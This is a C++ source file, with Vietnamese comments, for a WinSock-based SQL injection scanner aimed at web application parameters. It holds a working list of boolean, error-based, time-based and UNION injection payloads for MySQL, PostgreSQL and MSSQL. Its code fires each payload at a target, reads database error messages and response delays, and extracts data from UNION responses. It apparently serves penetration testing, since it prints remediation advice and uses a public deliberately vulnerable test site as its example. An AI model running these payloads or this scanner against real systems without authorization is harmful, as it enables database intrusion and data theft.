// SQLInjectionScanner.cpp
// Compile with: Visual Studio 2022 - Console Application

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 65536

class Payload {
public:
    std::string name;
    std::string payload;
    std::string technique;

    Payload(std::string n, std::string p, std::string t)
        : name(n), payload(p), technique(t) {
    }
};

class Target {
public:
    std::string host;
    int port;
    std::string path;
    std::string data;
    bool use_post;

    Target() : port(80), use_post(false) {}
};

class SQLInjectionScanner {
private:
    Target target;
    std::vector<Payload> payloads;
    std::string baseline_response;
    int baseline_time;
    SOCKET sock;

    // Khởi tạo Winsock
    bool initWinsock() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[-] Winsock initialization failed" << std::endl;
            return false;
        }
        return true;
    }

    // Tạo HTTP request
    std::string createHTTPRequest(const std::string& param_value) {
        std::string request;
        std::string full_path;

        if (target.use_post) {
            full_path = target.path;
            std::string post_data = target.data;

            // Thay thế [INJECT] bằng payload
            size_t inject_pos = post_data.find("[INJECT]");
            if (inject_pos != std::string::npos) {
                post_data.replace(inject_pos, 8, param_value);
            }

            // Tạo POST request
            request = "POST " + full_path + " HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: Mozilla/5.0 SQLScanner/1.0\r\n";
            request += "Content-Type: application/x-www-form-urlencoded\r\n";
            request += "Content-Length: " + std::to_string(post_data.length()) + "\r\n";
            request += "Connection: close\r\n";
            request += "\r\n";
            request += post_data;
        }
        else {
            // GET request
            full_path = target.path + param_value;
            request = "GET " + full_path + " HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: Mozilla/5.0 SQLScanner/1.0\r\n";
            request += "Accept: */*\r\n";
            request += "Connection: close\r\n";
            request += "\r\n";
        }

        return request;
    }

    // URL Encode cho payload
    std::string urlEncode(const std::string& str) {
        std::string encoded;
        for (char c : str) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                encoded += c;
            }
            else if (c == ' ') {
                encoded += '+';
            }
            else {
                char hex[4];
                sprintf_s(hex, sizeof(hex), "%%%02X", (unsigned char)c);
                encoded += hex;
            }
        }
        return encoded;
    }

    // Gửi request và nhận response
    bool sendRequest(const std::string& payload_value, std::string& response, int& response_time) {
        // Tạo socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "[-] Socket creation failed: " << WSAGetLastError() << std::endl;
            return false;
        }

        // Resolve host
        struct hostent* server = gethostbyname(target.host.c_str());
        if (!server) {
            std::cerr << "[-] Cannot resolve host: " << target.host << std::endl;
            closesocket(sock);
            return false;
        }

        // Cấu hình địa chỉ server
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target.port);
        memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);

        // Kết nối
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cerr << "[-] Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            return false;
        }

        // Mã hóa payload cho URL nếu là GET request
        std::string final_payload = payload_value;
        if (!target.use_post) {
            final_payload = urlEncode(payload_value);
        }

        std::string request = createHTTPRequest(final_payload);

        // Gửi request
        clock_t start = clock();
        if (send(sock, request.c_str(), (int)request.length(), 0) == SOCKET_ERROR) {
            std::cerr << "[-] Send failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            return false;
        }

        // Nhận response
        char buffer[BUFFER_SIZE];
        response.clear();
        int bytes_received;

        // Set timeout
        int timeout = 10000; // 10 seconds
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        while ((bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
            buffer[bytes_received] = '\0';
            response += buffer;
            if (response.length() >= BUFFER_SIZE) break;
        }

        clock_t end = clock();
        response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);

        closesocket(sock);
        return true;
    }

    // Kiểm tra lỗi SQL trong response
    bool hasSQLError(const std::string& response) {
        std::vector<std::string> errors = {
            "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
            "SQLite", "Unclosed quotation", "Microsoft OLE DB",
            "You have an error", "Warning: mysql", "mysqli_sql_exception",
            "PDOException", "SQLSTATE", "Unknown column",
            "Table doesn't exist", "Division by zero",
            "syntax error", "MySQL", "MariaDB"
        };

        std::string response_lower = response;
        std::transform(response_lower.begin(), response_lower.end(), response_lower.begin(), ::tolower);

        for (const auto& error : errors) {
            std::string error_lower = error;
            std::transform(error_lower.begin(), error_lower.end(), error_lower.begin(), ::tolower);

            if (response_lower.find(error_lower) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    // So sánh response (boolean-based)
    bool responsesDiffer(const std::string& resp1, const std::string& resp2) {
        int len1 = (int)resp1.length();
        int len2 = (int)resp2.length();

        if (abs(len1 - len2) > 100) return true;

        std::vector<std::string> keywords = { "error", "invalid", "warning",
                                              "success", "welcome", "found",
                                              "true", "false" };

        for (const auto& keyword : keywords) {
            bool in_resp1 = (resp1.find(keyword) != std::string::npos);
            bool in_resp2 = (resp2.find(keyword) != std::string::npos);
            if (in_resp1 != in_resp2) return true;
        }

        return false;
    }

    // Extract dữ liệu từ Union-based injection
    std::string extractUnionData(const std::string& response) {
        // Tìm body của response
        size_t body_start = response.find("\r\n\r\n");
        if (body_start == std::string::npos) return "";

        std::string body = response.substr(body_start + 4);

        // Tìm pattern dữ liệu
        size_t data_start = body.find(":-:");
        if (data_start == std::string::npos) {
            data_start = body.find("---");
        }
        if (data_start == std::string::npos) {
            data_start = body.find(">");
            if (data_start != std::string::npos) data_start++;
        }

        size_t data_end = body.find("<br>", data_start);
        if (data_end == std::string::npos) {
            data_end = body.find("\n", data_start);
        }
        if (data_end == std::string::npos) {
            data_end = body.find("</", data_start);
        }
        if (data_end == std::string::npos) {
            data_end = body.length();
        }

        if (data_end > data_start && (data_end - data_start) < 500) {
            std::string data = body.substr(data_start, data_end - data_start);
            // Clean data
            data.erase(std::remove(data.begin(), data.end(), '\n'), data.end());
            data.erase(std::remove(data.begin(), data.end(), '\r'), data.end());
            data.erase(std::remove(data.begin(), data.end(), '\t'), data.end());

            // Trim whitespace
            size_t start = data.find_first_not_of(" \t\n\r");
            size_t end = data.find_last_not_of(" \t\n\r");
            if (start != std::string::npos && end != std::string::npos) {
                data = data.substr(start, end - start + 1);
            }

            if (!data.empty() && data.length() < 500) {
                return data;
            }
        }

        return "";
    }

    void initPayloads() {
        payloads.push_back(Payload("Boolean - AND true", "' AND '1'='1", "boolean"));
        payloads.push_back(Payload("Boolean - AND false", "' AND '1'='2", "boolean"));
        payloads.push_back(Payload("Boolean - OR true", "' OR '1'='1", "boolean"));
        payloads.push_back(Payload("Boolean - OR false", "' OR '1'='2", "boolean"));

        payloads.push_back(Payload("Error - MySQL", "' AND extractvalue(1,concat(0x7e,database()))-- -", "error"));
        payloads.push_back(Payload("Error - MySQL updatexml", "' AND updatexml(1,concat(0x7e,database()),1)-- -", "error"));
        payloads.push_back(Payload("Error - PostgreSQL", "' AND 1=cast((SELECT version()) as int)-- -", "error"));
        payloads.push_back(Payload("Error - MSSQL", "' AND 1=convert(int,@@version)-- -", "error"));

        payloads.push_back(Payload("Time - MySQL (5s)", "' AND SLEEP(5)-- -", "time"));
        payloads.push_back(Payload("Time - PostgreSQL (5s)", "' AND pg_sleep(5)-- -", "time"));
        payloads.push_back(Payload("Time - MSSQL (5s)", "'; WAITFOR DELAY '00:00:05'-- -", "time"));

        payloads.push_back(Payload("Union - 1 column", "' UNION SELECT NULL-- -", "union"));
        payloads.push_back(Payload("Union - 2 columns", "' UNION SELECT NULL,NULL-- -", "union"));
        payloads.push_back(Payload("Union - 3 columns", "' UNION SELECT NULL,NULL,NULL-- -", "union"));
        payloads.push_back(Payload("Union - 4 columns", "' UNION SELECT NULL,NULL,NULL,NULL-- -", "union"));
        payloads.push_back(Payload("Union - 5 columns", "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", "union"));
        payloads.push_back(Payload("Union - 6 columns", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -", "union"));
    }

public:
    SQLInjectionScanner(const Target& t) : target(t) {
        initWinsock();
        initPayloads();
    }

    ~SQLInjectionScanner() {
        WSACleanup();
    }

    void scan() {
        std::cout << "\n========================================" << std::endl;
        std::cout << "SQL Injection Scanner v2.0 (C++/WinSock)" << std::endl;
        std::cout << "========================================" << std::endl;
        std::cout << "Target: " << target.host << ":" << target.port << target.path << std::endl;
        std::cout << "Method: " << (target.use_post ? "POST" : "GET") << std::endl;

        // Lấy baseline
        std::cout << "\n[*] Getting baseline response..." << std::endl;
        if (!sendRequest("''", baseline_response, baseline_time)) {
            std::cout << "[-] Cannot connect to target!" << std::endl;
            return;
        }
        std::cout << "[+] Baseline: " << baseline_response.length()
            << " bytes, " << baseline_time << " ms" << std::endl;

        bool vulnerable = false;
        std::string found_technique;
        std::vector<std::string> extracted_data;

        std::cout << "\n[*] Testing " << payloads.size() << " payloads..." << std::endl;
        std::cout << "----------------------------------------" << std::endl;

        for (size_t i = 0; i < payloads.size(); i++) {
            std::cout << "  [" << (i + 1) << "/" << payloads.size() << "] "
                << payloads[i].name << " (" << payloads[i].technique << ")... ";
            std::cout.flush();

            std::string response;
            int response_time;

            if (!sendRequest(payloads[i].payload, response, response_time)) {
                std::cout << "FAILED" << std::endl;
                continue;
            }

            bool is_vulnerable = false;
            std::string extra_info;

            if (payloads[i].technique == "error") {
                if (hasSQLError(response)) {
                    is_vulnerable = true;
                    extra_info = "SQL error detected";
                }
            }
            else if (payloads[i].technique == "boolean") {
                if (responsesDiffer(baseline_response, response)) {
                    is_vulnerable = true;
                    extra_info = "Response differs";
                }
            }
            else if (payloads[i].technique == "time") {
                if (response_time > baseline_time + 4000) {
                    is_vulnerable = true;
                    extra_info = "Delay: " + std::to_string(response_time) + "ms";
                }
            }
            else if (payloads[i].technique == "union") {
                std::string data = extractUnionData(response);
                if (!data.empty() && data.length() < 500) {
                    is_vulnerable = true;
                    extra_info = "Extracted: " + data;
                    extracted_data.push_back(data);
                }
                else if (response.length() != baseline_response.length()) {
                    is_vulnerable = true;
                    extra_info = "Response size changed";
                }
            }

            if (is_vulnerable) {
                std::cout << "VULNERABLE! (" << extra_info << ")" << std::endl;
                vulnerable = true;
                if (found_technique.empty()) {
                    found_technique = payloads[i].technique;
                }
            }
            else {
                std::cout << "Not vulnerable" << std::endl;
            }

            // Delay giữa các request để tránh overload
            Sleep(100);
        }

        std::cout << "----------------------------------------" << std::endl;

        if (vulnerable) {
            std::cout << "\n[!] SQL INJECTION VULNERABILITY CONFIRMED!" << std::endl;
            std::cout << "[+] Technique: " << found_technique << std::endl;

            if (!extracted_data.empty()) {
                std::cout << "\n[+] Extracted data:" << std::endl;
                for (const auto& data : extracted_data) {
                    std::cout << "    - " << data << std::endl;
                }
            }

            std::cout << "\n[*] Recommendations:" << std::endl;
            std::cout << "    - Use parameterized queries/prepared statements" << std::endl;
            std::cout << "    - Implement input validation and sanitization" << std::endl;
            std::cout << "    - Use WAF (Web Application Firewall)" << std::endl;
            std::cout << "    - Limit database user privileges" << std::endl;
            std::cout << "    - Disable error message display in production" << std::endl;
        }
        else {
            std::cout << "\n[+] No SQL injection vulnerability detected." << std::endl;
        }
    }
};

// Parse URL và arguments
bool parseArguments(int argc, char* argv[], Target& target) {
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " -u <url> [options]" << std::endl;
        std::cout << "\nOptions:" << std::endl;
        std::cout << "  -u <url>         Target URL" << std::endl;
        std::cout << "  --data=<data>    POST data (use [INJECT] as injection point)" << std::endl;
        std::cout << "\nExamples:" << std::endl;
        std::cout << "  " << argv[0] << " -u \"http://testphp.vulnweb.com/artists.php?id=1\"" << std::endl;
        std::cout << "  " << argv[0] << " -u \"http://testphp.vulnweb.com/userinfo.php\" --data=\"name=admin&pass=[INJECT]\"" << std::endl;
        std::cout << "\nPress any key to exit...";
        std::cin.get();
        return false;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            std::string url = argv[++i];

            // Parse URL
            if (url.find("http://") == 0) {
                url = url.substr(7);
            }
            else if (url.find("https://") == 0) {
                url = url.substr(8);
                target.port = 443;
                std::cout << "[-] Warning: HTTPS not fully supported, trying HTTP on port 80" << std::endl;
                target.port = 80; // Fallback to HTTP
            }

            size_t slash_pos = url.find('/');
            if (slash_pos != std::string::npos) {
                target.host = url.substr(0, slash_pos);
                target.path = url.substr(slash_pos);
            }
            else {
                target.host = url;
                target.path = "/";
            }

            // Check for port in host
            size_t colon_pos = target.host.find(':');
            if (colon_pos != std::string::npos) {
                target.port = std::stoi(target.host.substr(colon_pos + 1));
                target.host = target.host.substr(0, colon_pos);
            }
        }
        else if (strncmp(argv[i], "--data=", 7) == 0) {
            target.data = argv[i] + 7;
            target.use_post = true;
        }
    }

    if (target.host.empty() || target.path.empty()) {
        std::cout << "[-] Invalid URL format" << std::endl;
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    // Set console UTF-8 for Vietnamese characters
    SetConsoleOutputCP(CP_UTF8);

    Target target;

    if (!parseArguments(argc, argv, target)) {
        return 1;
    }

    SQLInjectionScanner scanner(target);
    scanner.scan();

    std::cout << "\nPress any key to exit...";
    std::cin.get();

    return 0;
}
